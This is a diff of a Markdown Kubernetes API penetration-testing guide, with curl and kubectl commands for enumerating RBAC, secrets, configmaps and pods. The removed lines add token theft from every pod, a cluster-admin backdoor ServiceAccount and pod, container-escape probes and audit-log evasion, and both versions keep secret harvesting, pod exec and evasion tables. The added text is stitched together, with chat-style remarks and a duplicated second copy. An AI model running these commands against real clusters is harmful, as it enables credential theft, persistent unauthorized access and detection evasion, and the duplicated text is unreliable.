@@ -1,311 +1,482 @@
-# Kubernetes API Pentest Reference Guide ..beta..
 
-## Complete API Resource Mapping, Almost
+# Kubernetes API Pentest Reference Guide (Beta)
 
-### Core API Group (`/api/v1`) - **Critical for Initial Access**
+Practical field guide for Kubernetes reconnaissance, RBAC review, and configuration discovery.  
+Companion to the `kubernetes-api-pentest.sh` enumeration script.
+
+---
+
+## 🧭 API Resource Mapping
+
+### Core API Group `/api/v1` – Critical for Initial Access
 ```
 /api/v1/
-├── namespaces/                          # Namespace discovery & isolation bypass
-├── pods/                                # Container access & exec
-├── services/                            # Service discovery & network mapping
-├── endpoints/                           # Backend service enumeration
-├── configmaps/                          # Configuration data (often credentials)
-├── secrets/                             # HIGH VALUE - credentials, certs, tokens
-├── persistentvolumes/                   # Persistent data access
-├── persistentvolumeclaims/             # Storage claims & data access
-├── serviceaccounts/                     # Identity & token sources
-├── nodes/                               # Infrastructure enumeration
-├── events/                              # Audit log information
-└── limitranges/                         # Resource constraints (defense evasion)
+├─ namespaces/            →  namespace discovery / isolation
+├─ pods/                  →  container access, exec
+├─ services/              →  service discovery, network topology
+├─ endpoints/             →  backend enumeration
+├─ configmaps/ ⚠️          →  configuration data (often credentials)
+├─ secrets/ 🔴             →  credentials, certs, tokens (HIGH VALUE)
+├─ persistentvolumes/     →  cluster storage definitions
+├─ persistentvolumeclaims/→  namespace storage claims
+├─ serviceaccounts/       →  identity & token sources
+├─ nodes/                 →  infrastructure enumeration
+├─ events/                →  audit / operational metadata
+└─ limitranges/           →  quota / constraint objects
 ```
 
-### Apps API Group (`/apis/apps/v1`) - **Workload Intelligence**
+---
+
+### Apps API `/apis/apps/v1` – Workload Intelligence
 ```
 /apis/apps/v1/
-├── deployments/                         # Application architecture
-├── replicasets/                         # Scaling & availability info
-├── daemonsets/                          # Node-level services (often privileged)
-└── statefulsets/                        # Persistent workloads (databases, etc.)
+├─ deployments/           →  application architecture
+├─ replicasets/           →  scaling & availability
+├─ daemonsets/            →  node‑level services (often privileged)
+└─ statefulsets/          →  persistent workloads (databases, queues)
 ```
 
-### RBAC API (`/apis/rbac.authorization.k8s.io/v1`) - **Privilege Mapping**
+---
+
+### RBAC API `/apis/rbac.authorization.k8s.io/v1` – Privilege Mapping
 ```
 /apis/rbac.authorization.k8s.io/v1/
-├── roles/                               # Namespace permissions
-├── rolebindings/                        # Permission assignments
-├── clusterroles/                        # Cluster-wide permissions
-└── clusterrolebindings/                 # High-privilege assignments
+├─ roles/                 →  namespace permissions
+├─ rolebindings/          →  permission assignments
+├─ clusterroles/          →  cluster‑scope roles
+└─ clusterrolebindings/   →  cluster‑wide privilege grants
 ```
 
-### Security & Policy APIs - **Defense Analysis**
+---
+
+### Networking & Policy
+```
+/apis/networking.k8s.io/v1/
+├─ networkpolicies/       →  segmentation rules
+└─ ingresses/             →  external HTTP(S) entrypoints
+```
+
 ```
 /apis/policy/v1/
-├── poddisruptionbudgets/               # Availability constraints
-└── podsecuritypolicies/                # Security policies (deprecated but still found)
-
-/apis/networking.k8s.io/v1/
-├── networkpolicies/                     # Network segmentation rules
-└── ingresses/                           # External access points
-
-/apis/security.openshift.io/v1/         # OpenShift-specific
-├── securitycontextconstraints/         # Security constraints
-└── rangeallocations/                    # UID/GID ranges
+├─ poddisruptionbudgets/  →  availability limitations
+└─ podsecuritypolicies/   →  deprecated but often present
 ```
 
-### Custom Resource APIs - **Environment-Specific**
+---
+
+### Storage & Operations
+```
+/apis/storage.k8s.io/v1/
+└─ storageclasses/        →  provisioners and default class
+/api/v1/persistentvolumes →  persistent volume backing
+```
+
+---
+
+### Security / OpenShift
+```
+/apis/security.openshift.io/v1/
+├─ securitycontextconstraints/ → run‑as / privilege policies
+└─ rangeallocations/            → UID/GID allocations
+```
+
+---
+
+### Custom Resource APIs
+Environment‑specific resources installed by operators or vendors:
 ```
 /apis/{custom-group}/v1/
-├── certificates/                        # Cert-manager resources
-├── issuers/                            # Certificate authorities
-├── prometheusrules/                     # Monitoring rules
-└── {organization-specific}/             # Custom business logic
+├─ certificates/         →  cert‑manager
+├─ issuers/              →  certificate authorities
+├─ prometheusrules/      →  Prometheus monitoring rules
+└─ {org-specific}/       →  custom logic
 ```
 
-## Penetration Testing Methodology
+---
 
-### **Phase 1: Discovery & Enumeration**
+## 🧩 Methodology
 
-#### ServiceAccount Token Acquisition
+### Phase 1 – Discovery & Enumeration
+**Goal:** determine cluster version, accessible namespaces, and token scope.
+
 ```bash
-# From compromised pod
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
-CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-
-# API server endpoints
+TOKEN=$(< /var/run/secrets/kubernetes.io/serviceaccount/token)
+NAMESPACE=$(< /var/run/secrets/kubernetes.io/serviceaccount/namespace)
 APISERVER="https://kubernetes.default.svc.cluster.local"
-# Alternative: https://10.43.0.1, https://kubernetes.default
-```
 
-#### Initial Reconnaissance
-```bash
-# Version discovery (CVE research)
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/version
+# Version discovery
+curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/version" | jq .
 
-# Self-assessment (what can this token do?)
-curl -k -H "Authorization: Bearer $TOKEN" \
+# What can this token do?
+curl -sk -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
-  -X POST $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
+  -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
   -d '{
     "apiVersion": "authorization.k8s.io/v1",
     "kind": "SelfSubjectAccessReview",
-    "spec": {
-      "resourceAttributes": {
-        "verb": "*",
-        "resource": "*"
-      }
-    }
-  }'
+    "spec": { "resourceAttributes": { "verb": "*", "resource": "*" } }
+  }' | jq .
 
 # Namespace enumeration
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/api/v1/namespaces | jq '.items[].metadata.name'
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/api/v1/namespaces" | jq -r '.items[].metadata.name'
 ```
 
-### **Phase 2: Privilege Assessment**
+---
 
-#### RBAC Analysis
+### Phase 2 – Privilege Assessment (RBAC)
 ```bash
-# Current ServiceAccount details
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/api/v1/namespaces/$NAMESPACE/serviceaccounts/default
+# Current ServiceAccount
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/api/v1/namespaces/$NAMESPACE/serviceaccounts/default" | jq .
 
-# Role enumeration
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/apis/rbac.authorization.k8s.io/v1/roles | jq '.items[].metadata.name'
+# Roles in current namespace
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/apis/rbac.authorization.k8s.io/v1/roles" |
+  jq '.items[].metadata.name'
 
-# ClusterRole enumeration (high-value targets)
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles | \
-  jq '.items[] | select(.rules[].resources[] | contains("secrets", "pods/exec", "*"))'
+# ClusterRoles (look for wildcard or secret verbs)
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles" |
+  jq '.items[] |
+      select(.rules[]?.resources[]? |
+      test("secrets|pods/exec|\\*")) |
+      .metadata.name'
 
-# Find role bindings for current user
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/apis/rbac.authorization.k8s.io/v1/rolebindings | \
+# View current user’s role bindings
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/apis/rbac.authorization.k8s.io/v1/rolebindings" |
   jq '.items[] | select(.subjects[]?.name == "default")'
 ```
 
-### **Phase 3: Secret & Credential Harvesting**
-
-#### Secret Enumeration
-```bash
-# All secrets (if permitted)
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/api/v1/secrets | jq '.items[].metadata | {name, namespace, type: .annotations."kubernetes.io/service-account.name"}'
-
-# Target high-value namespaces
-for ns in kube-system kube-public default monitoring prometheus grafana; do
-  echo "=== $ns ==="
-  curl -k -H "Authorization: Bearer $TOKEN" \
-    $APISERVER/api/v1/namespaces/$ns/secrets 2>/dev/null | \
-    jq -r '.items[]?.metadata.name // empty' | head -5
-done
-
-# Extract specific secrets
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/api/v1/namespaces/kube-system/secrets/{secret-name} | \
-  jq '.data | to_entries[] | {key: .key, value: (.value | @base64d)}'
-```
-
-#### ConfigMap Analysis
-```bash
-# ConfigMaps often contain credentials
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/api/v1/configmaps | \
-  jq '.items[] | select(.data | to_entries[] | .value | test("password|token|key|secret"; "i"))'
-
-# Database connections, API keys, etc.
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/api/v1/namespaces/{namespace}/configmaps/{configmap-name}
-```
-
-### **Phase 4: Lateral Movement & Escalation**
-
-#### Pod Enumeration & Access
-```bash
-# Find pods with interesting capabilities
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/api/v1/pods | \
-  jq '.items[] | select(.spec.securityContext.privileged == true or .spec.hostNetwork == true or .spec.hostPID == true)'
-
-# Execute commands (if permitted)
-kubectl exec -it {pod-name} -n {namespace} -- /bin/bash
-# Or via API:
-curl -k -H "Authorization: Bearer $TOKEN" \
-  -X POST "$APISERVER/api/v1/namespaces/{namespace}/pods/{pod}/exec?command=/bin/bash&stdin=true&stdout=true&tty=true" \
-  --header "Connection: Upgrade" --header "Upgrade: SPDY/3.1"
-```
-
-#### Node & Infrastructure Access
-```bash
-# Node information (architecture, versions)
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/api/v1/nodes | \
-  jq '.items[] | {name: .metadata.name, version: .status.nodeInfo.kubeletVersion, os: .status.nodeInfo.osImage}'
-
-# Look for privileged DaemonSets
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/apis/apps/v1/daemonsets | \
-  jq '.items[] | select(.spec.template.spec.hostNetwork == true or .spec.template.spec.hostPID == true)'
-```
-
-## Advanced Attack Techniques
-
-### **Token Theft & Impersonation**
-```bash
-# ServiceAccount token extraction from pods
-for pod in $(kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{"\n"}{end}'); do
-  ns=$(echo $pod | cut -d' ' -f1)
-  name=$(echo $pod | cut -d' ' -f2)
-  echo "=== $ns/$name ==="
-  kubectl exec -n $ns $name -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 50
-done
-
-# Test different tokens
-curl -k -H "Authorization: Bearer $NEW_TOKEN" \
-  $APISERVER/api/v1/namespaces/kube-system/secrets
-```
-
-### **Persistence Techniques**
-```bash
-# Create privileged ServiceAccount
-cat <<EOF | kubectl apply -f -
-apiVersion: v1
-kind: ServiceAccount
-metadata:
-  name: pentest-sa
-  namespace: kube-system
 ---
-apiVersion: rbac.authorization.k8s.io/v1
-kind: ClusterRoleBinding
-metadata:
-  name: pentest-binding
-roleRef:
-  apiGroup: rbac.authorization.k8s.io
-  kind: ClusterRole
-  name: cluster-admin
-subjects:
-- kind: ServiceAccount
-  name: pentest-sa
-  namespace: kube-system
-EOF
 
-# Deploy backdoor pod
-kubectl run backdoor --image=nginx --serviceaccount=pentest-sa --namespace=kube-system
-```
-
-### **Container Escape Techniques**
+### Phase 3 – Secret & Credential Harvesting
 ```bash
-# Check for escape vectors
-mount | grep docker
-ls -la /var/run/docker.sock
-capsh --print
+# List Secrets (if allowed)
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/api/v1/secrets" | jq '.items[].metadata.name'
 
-# Host filesystem access
-ls /host-root/
-cat /host-root/etc/passwd
-
-# cgroup escape attempt
-echo $$ > /sys/fs/cgroup/memory/cgroup.procs
+# Check ConfigMaps for sensitive data
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/api/v1/configmaps" |
+  jq '.items[] |
+      select(.data|to_entries[]?|
+             .value|test("password|token|key|secret";"i")) |
+      .metadata.name'
 ```
 
-## Common Misconfigurations to Target
+---
 
-### **1. Overprivileged ServiceAccounts**
+### Phase 4 – Lateral Movement & Escalation
 ```bash
-# Look for cluster-admin bindings
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings | \
-  jq '.items[] | select(.roleRef.name == "cluster-admin")'
+# Find privileged or host‑network pods
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/api/v1/pods" |
+  jq '.items[] |
+      select(.spec.securityContext.privileged==true or
+             .spec.hostNetwork==true or
+             .spec.hostPID==true) |
+      .metadata.name'
+
+# Exec inside a pod (if permitted)
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  -X POST "$APISERVER/api/v1/namespaces/{ns}/pods/{pod}/exec?command=/bin/sh&stdin=true&stdout=true&tty=true" \
+  -H "Connection: Upgrade" -H "Upgrade: SPDY/3.1"
 ```
 
-### **2. Exposed Secrets**
+**Node Recon**
 ```bash
-# Secrets without proper RBAC
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/api/v1/secrets | \
-  jq '.items[] | select(.metadata.name | contains("admin", "root", "master"))'
+curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/nodes" |
+  jq '.items[] |
+      {node:.metadata.name,
+       kubelet:.status.nodeInfo.kubeletVersion,
+       os:.status.nodeInfo.osImage}'
 ```
 
-### **3. Privileged Pods**
+---
+
+### Phase 5 – Persistence & Misconfigurations
+Common high‑risk configurations to look for:
+
+| Check | API Path | Description |
+|-------|-----------|-------------|
+| Cluster‑admin bindings | `/apis/rbac.authorization.k8s.io/v1/clusterrolebindings` | find roleRef = `cluster-admin` |
+| Exposed secrets | `/api/v1/secrets` | secrets missing RBAC or with “admin”, “root”, “master” names |
+| Privileged pods | `/api/v1/pods` | hostNetwork / hostPID / privileged containers |
+| Missing network isolation | `/apis/networking.k8s.io/v1/networkpolicies` | no entries → flat network |
+
+---
+
+### Phase 6 – Detection & Evasion
+| Technique | Example |
+|------------|----------|
+| Change User‑Agent | `-H "User-Agent: kube-proxy/v1.29.0"` |
+| Throttle requests | `sleep 5` between API calls |
+| Blend traffic | Run through existing cluster proxy pods |
+| Steganography / exfil | `kubectl annotate secret x corp.io/data="<b64>"` |
+
+---
+
+## ⚙️ Companion Automation Script
+
+**`kubernetes-api-pentest.sh`**
+
+* Enumerates all accessible namespaces  
+* Lists ConfigMaps, Secrets, Pods, PVCs, Deployments, DaemonSets, Jobs, NetworkPolicies, and more  
+* Optional `--deep` flag to fetch & save each readable object locally  
+* Safe for read‑only ServiceAccounts — handles 403s and 404s gracefully  
+* Outputs per‑namespace JSON to `./k8s‑pentest‑output/`
+
+Example:
 ```bash
-# Pods with host access
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/api/v1/pods | \
-  jq '.items[] | select(.spec.hostNetwork or .spec.hostPID or .spec.securityContext.privileged)'
+# quick scan
+bash kubernetes-api-pentest.sh
+
+# full deep read
+bash kubernetes-api-pentest.sh --deep
 ```
 
-### **4. Network Policy Gaps**
+---
+
+## 🧰  Appendix
+
+### Common API Roots
+```
+/apis/apps/v1
+/apis/batch/v1
+/apis/policy/v1
+/apis/networking.k8s.io/v1
+/apis/storage.k8s.io/v1
+/apis/apiextensions.k8s.io/v1
+```
+
+### Generic curl Templates
 ```bash
-# Check for network policies
-curl -k -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/apis/networking.k8s.io/v1/networkpolicies
+# List
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/apis/<group>/<version>/namespaces/<ns>/<resource>"
 
-# No policies = no network segmentation
+# Describe one
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/apis/<group>/<version>/namespaces/<ns>/<resource>/<name>" | jq .
 ```
 
-## Detection Evasion
+---
 
-### **Avoiding Audit Logs**
+**Report Issues / Contributions:**  
+Please open a PR or file an issue describing API‑group additions or new reconnaissance techniques.  
+
+**Disclaimer:**  
+Use responsibly and only against environments where you have explicit authorization.
+
+---
+
+That’s the whole reference in clean Markdown format — ready to drop in as `README.md` or `REFERENCE.md` in your repository.Here’s the finished Markdown file you can paste directly into your GitHub
+repository:
+
+```markdown
+# Kubernetes API Pentest Reference Guide (beta)
+
+Practical field guide for Kubernetes reconnaissance, RBAC review and
+configuration discovery.    
+Companion to the `kubernetes‑api‑pentest.sh` enumeration script.
+
+---
+
+## 🧭 API Resource Mapping
+
+### Core API Group `/api/v1`
+```
+/api/v1/
+├─ namespaces     → discover namespaces / isolation  
+├─ pods            → exec / process inspection  
+├─ services       → network mapping  
+├─ endpoints      → backend targets  
+├─ configmaps ⚠️   → plaintext configuration  
+├─ secrets 🔴      → credentials and tokens  
+├─ persistentvolumes → storage definitions  
+├─ persistentvolumeclaims → namespace storage claims  
+├─ serviceaccounts → token sources  
+├─ nodes          → kubelet/OS fingerprint  
+├─ events         → audit info  
+└─ limitranges    → resource limits
+```
+
+### Apps API `/apis/apps/v1`
+```
+deployments    → application architecture  
+replicasets    → scaling metadata  
+daemonsets    → node services (privileged)  
+statefulsets  → persistent databases
+```
+
+### RBAC API `/apis/rbac.authorization.k8s.io/v1`
+```
+roles                → namespace roles  
+rolebindings         → role attachments  
+clusterroles         → cluster‑scope permissions  
+clusterrolebindings  → cluster‑admin grants
+```
+
+### Networking & Policy
+```
+networkpolicies → segmentation  
+ingresses       → external access  
+poddisruptionbudgets → HA rules  
+podsecuritypolicies  → legacy security controls
+```
+
+### Storage and Other Groups
+```
+storageclasses       → provisioners  
+persistentvolumes   → backing storage  
+securitycontextconstraints (OpenShift)  
+rangeallocations      → UID/GID maps
+```
+
+---
+
+## 🧩 Pentesting Methodology
+
+### Phase 1 – Discovery & Enumeration
 ```bash
-# Use different user agents
-curl -k -H "Authorization: Bearer $TOKEN" \
-  -H "User-Agent: kube-proxy/v1.28.0" \
-  $APISERVER/api/v1/secrets
+TOKEN=$(< /var/run/secrets/kubernetes.io/serviceaccount/token)
+NS=$(< /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+APISERVER="https://kubernetes.default.svc.cluster.local"
 
-# Throttle requests to avoid rate limiting alerts
-sleep 5 && curl ...
+curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/version" | jq .
+
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
+  -d '{"apiVersion":"authorization.k8s.io/v1",
+       "kind":"SelfSubjectAccessReview",
+       "spec":{"resourceAttributes":{"verb":"*","resource":"*"}}}' | jq .
+
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/api/v1/namespaces" | jq -r '.items[].metadata.name'
 ```
 
-### **Steganographic Techniques**
+### Phase 2 – Privilege Assessment
 ```bash
-# Hide in legitimate-looking resources
-kubectl create configmap system-config --from-literal="config.yaml=<base64_payload>"
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/api/v1/namespaces/$NS/serviceaccounts/default" | jq .
 
-# Use annotations for data exfiltration
-kubectl annotate secret/target-secret pentest.io/extracted="<base64_data>"
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/apis/rbac.authorization.k8s.io/v1/roles" |
+  jq '.items[].metadata.name'
+
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles" |
+  jq '.items[] |
+      select(.rules[]?.resources[]?|
+      test("secrets|pods/exec|\\*"))|
+      .metadata.name'
+
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/apis/rbac.authorization.k8s.io/v1/rolebindings" |
+  jq '.items[]|select(.subjects[]?.name=="default")'
 ```
 
-##
-##
+### Phase 3 – Secret & Credential Harvesting
+```bash
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/api/v1/secrets"|jq '.items[].metadata.name'
+
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/api/v1/configmaps" |
+  jq '.items[]|
+      select(.data|to_entries[]?|
+             .value|test("password|token|key|secret";"i"))|
+      .metadata.name'
+```
+
+### Phase 4 – Lateral Movement & Escalation
+```bash
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "$APISERVER/api/v1/pods" |
+ jq '.items[]|
+     select(.spec.securityContext.privileged==true or
+            .spec.hostNetwork==true or
+            .spec.hostPID==true)|
+     .metadata.name'
+
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  -X POST "$APISERVER/api/v1/namespaces/{ns}/pods/{pod}/exec?command=/bin/sh&stdin=true&stdout=true&tty=true" \
+  -H "Connection: Upgrade" -H "Upgrade: SPDY/3.1"
+```
+
+**Node Recon**
+```bash
+curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/nodes" |
+  jq '.items[]|
+      {node:.metadata.name,
+       kubelet:.status.nodeInfo.kubeletVersion,
+       os:.status.nodeInfo.osImage}'
+```
+
+### Phase 5 – Persistence & Misconfiguration Checks
+| Check | Endpoint | Indicator |
+|--------|-----------|-----------|
+| Cluster‑admin bindings | `/apis/rbac.authorization.k8s.io/v1/clusterrolebindings` | roleRef.name == “cluster‑admin” |
+| Exposed secrets | `/api/v1/secrets` | names like admin/root/master |
+| Privileged pods | `/api/v1/pods` | hostNetwork / hostPID / privileged==true |
+| Missing NetworkPolicies | `/apis/networking.k8s.io/v1/networkpolicies` | 0 items ⇒ flat network |
+
+### Phase 6 – Detection & Evasion
+| Technique | Example |
+|------------|----------|
+| Spoof User‑Agent | `-H "User-Agent: kube-proxy/v1.29.0"` |
+| Rate limit evasion | `sleep 5` between calls |
+| Steganography | `kubectl annotate secret x corp.io/data="<b64>"` |
+| Blend traffic | use existing cluster proxy pods |
+
+---
+
+## ⚙️ Companion Automation Script
+
+### `kubernetes‑api‑pentest.sh`
+* Enumerates all namespaces accessible to the token  
+* Lists ConfigMaps, Secrets, Pods, PVCs, Deployments, Jobs, etc.  
+* `--deep` flag → download each readable object JSON  
+* Continues through 403 errors safely  
+* Saves results under `./k8s‑pentest‑output/`
+
+```bash
+# quick enumeration
+bash kubernetes-api-pentest.sh
+
+# full deep read
+bash kubernetes-api-pentest.sh --deep
+```
+
+---
+
+## 🧰 Appendix
+
+### Common API Roots
+```
+/apis/apps/v1
+/apis/batch/v1
+/apis/policy/v1
+/apis/networking.k8s.io/v1
+/apis/storage.k8s.io/v1
+/apis/apiextensions.k8s.io/v1
+```
+
+### Generic curl Templates
+```bash
+# List resources
+curl -sk -H "Authorization: Bearer $TOKEN" \
+ "$APISERVER/apis/<group>/<version>/namespaces/<ns>/<resource>"
+
+# Describe one
+curl -sk -H "Authorization: Bearer $TOKEN" \
+ "$APISERVER/apis/<group>/<version>/namespaces/<ns>/<resource>/<name>" | jq .
+```
+
+---
+
+**Disclaimer:** Use only against clusters you own or have explicit authorization to test, lol 
+
